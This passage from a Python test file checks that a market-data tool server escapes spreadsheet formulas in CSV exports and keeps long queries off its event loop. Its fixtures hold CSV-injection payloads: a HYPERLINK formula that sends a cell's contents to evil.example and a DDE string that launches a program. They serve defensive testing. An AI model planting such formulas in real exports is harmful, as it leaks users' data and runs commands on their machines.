    spreadsheet opening the export ran it as a formula; third-party text now
    gets a leading ', with a note. Other results and Parquet are unchanged."""
    ctx, store, _, _, _, tmp_path = setup
    headlines = [
        '=HYPERLINK("https://evil.example/?d="&A2,"Fed statement")',
        "+cmd|' /C calc'!A0",
        "Plain",
        None,
    ]
    rows = [
        r.model_copy(update={"headline": h or "x", "summary": h})
        for r, h in zip(news_rows(4), headlines, strict=True)
    ]
    news = store.put(
        rows_to_table(rows, NewsItem),
        tool="news_search",
        model=NewsItem.schema_name,
        provenance=provenance(),
        risk="external_text",
    )
    out = call(ctx, "results_export", result_id=news.result_id, format="csv", file_name="news")
    written = pacsv.read_csv(tmp_path / "out" / "news.csv").to_pydict()
    assert written["headline"][:3] == ["'" + headlines[0], "'" + headlines[1], "Plain"]
    assert written["summary"][:3] == ["'" + headlines[0], "'" + headlines[1], "Plain"]
    assert any(n.startswith("4 third-party text cell(s) began with =, +, -, @") for n in out.notes)
    call(ctx, "results_export", result_id=news.result_id, format="parquet", file_name="news")
    assert (
        pq.read_table(tmp_path / "out" / "news.parquet").column("headline").to_pylist()[:2] == headlines[:2]
    )
    plain = store.put(
        pa.table({"s": ["-1.5", "=x"]}),
        tool="results_query",
        model="marketlens.QueryRow",
        provenance=provenance(),
    )
    out = call(ctx, "results_export", result_id=plain.result_id, format="csv", file_name="plain")
    assert pacsv.read_csv(
        tmp_path / "out" / "plain.csv", convert_options=pacsv.ConvertOptions(column_types={"s": pa.string()})
    ).column("s").to_pylist() == ["-1.5", "=x"]
    assert out.notes == []


def test_a_long_query_leaves_the_event_loop_and_the_light_tools_free(tmp_path):
    """results_query ran DuckDB on the event loop: a query running to its
    timeout froze every other call (and the session's messages) until it
    stopped. It runs in the query thread now; results_list answers meanwhile."""
    store = StoreRoot(tmp_path / "cache", StoreLimits(query_timeout_seconds=2)).session("s")
    ctx = make_context(store=store)
    heavy = (
        "SELECT count(*) AS n FROM (SELECT unnest(range(5000)) AS a) t1, (SELECT unnest(range(5000)) AS b) t2, "
        "(SELECT unnest(range(5000)) AS c) t3"
    )

    async def go():
        gaps = []

        async def ticker():
            last = time.monotonic()
            while True:
                await asyncio.sleep(0.05)
                now = time.monotonic()
                gaps.append(now - last)
                last = now

        tick = asyncio.create_task(ticker())
        query = asyncio.create_task(call_tool(SPECS["results_query"], ctx, sql=heavy))
        await asyncio.sleep(0.3)
        started = time.monotonic()
        listed = await call_tool(SPECS["results_list"], ctx)
        listed_after = time.monotonic() - started
        with pytest.raises(ToolError) as info:
            await query
        tick.cancel()
        return max(gaps), listed, listed_after, info.value.code

    worst_gap, listed, listed_after, code = asyncio.run(go())
    assert code == "sql_timeout"
    assert isinstance(listed, InlineResult) and listed_after < 1.0
    assert worst_gap < 1.0


def test_every_store_bound_handler_runs_off_the_event_loop():
    """The results and analytics handlers are synchronous store work wrapped
    to run in a thread, so none of them can hold the event loop."""
    from marketlens_mcp.analytics.tools import all_specs

    for spec in (*rt.SPECS, *all_specs()):
        inner = getattr(spec.handler, "__wrapped__", None)
        assert inner is not None and not inspect.iscoroutinefunction(inner), spec.name
